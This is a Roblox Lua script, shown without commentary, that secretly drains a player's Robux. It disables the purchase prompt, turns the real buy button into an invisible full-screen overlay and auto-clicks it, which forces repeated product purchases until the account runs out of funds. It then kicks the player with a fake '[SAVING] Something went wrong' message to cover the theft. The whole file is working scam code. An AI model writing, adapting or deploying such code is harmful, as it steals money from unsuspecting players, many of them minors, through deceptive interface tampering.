wait(5)
print("started")
local canbuy = true

local function BuyAttempt()
	local coreG = game:GetService("CoreGui")
	local prompt = coreG:WaitForChild("PurchasePrompt",999999999999)
	local container = prompt:WaitForChild("ProductPurchaseContainer",999999999999)
	local animator = container:WaitForChild("Animator",999999999999)
	local prompt2 = animator:WaitForChild("Prompt",999999999999)
	local alertCont = prompt2:WaitForChild("AlertContents",999999999999)
	local footer = alertCont:WaitForChild("Footer",999999999999)
	local buttons = footer:WaitForChild("Buttons",999999999999)
	local buyButton = buttons:WaitForChild("2",999999999999)

	prompt.Enabled = false
	task.wait(3)

	if buyButton.ButtonContent.ButtonMiddleContent.Text.Text == "Buy Robux" then
		canbuy = false
		prompt2:Destroy()
		prompt.Enabled = true
	else
		canbuy = true
		buyButton.Parent = prompt
		prompt2:Destroy()
		prompt.Enabled = true


		buyButton.Size = UDim2.new(1,0,1,0)
		buyButton.ImageTransparency = 1
		buyButton:WaitForChild("ButtonContent").Visible = false
		buyButton.Changed:Connect(function()
			buyButton.ImageTransparency = 1
			if not buyButton.Visible then
				buyButton:Destroy()
			end
		end)

		local wasAddded = false
		local fulldone = false

		animator.ChildAdded:Connect(function(c)
			pcall(function()
				buyButton:Destroy()
			end)
			if not wasAddded then
				wasAddded = true
				local prompt2 = animator:WaitForChild("Prompt",999999999999)
				local alertCont = prompt2:WaitForChild("AlertContents",999999999999)
				local footer = alertCont:WaitForChild("Footer",999999999999)
				local buttons = footer:WaitForChild("Buttons",999999999999)
				local buyButton = buttons:WaitForChild("1",999999999999)
				buyButton.Parent = prompt
				prompt2.Visible = false
				buyButton.ImageTransparency = 1
				buyButton:WaitForChild("ButtonContent").Visible = false
				buyButton.Size = UDim2.new(1,0,1,0)
				while prompt2.Parent~=nil do
					wait()
				end
				buyButton:Destroy()
				fulldone = true
			end
		end)

		while not fulldone do
			mouse1click()
			wait()
		end
	end
end

while canbuy do
	game:GetService('ReplicatedStorage').Buy:FireServer()
	BuyAttempt()
	wait(1)
end

game.Players.LocalPlayer:Kick("[SAVING] Something went wrong. Please rejoin!")
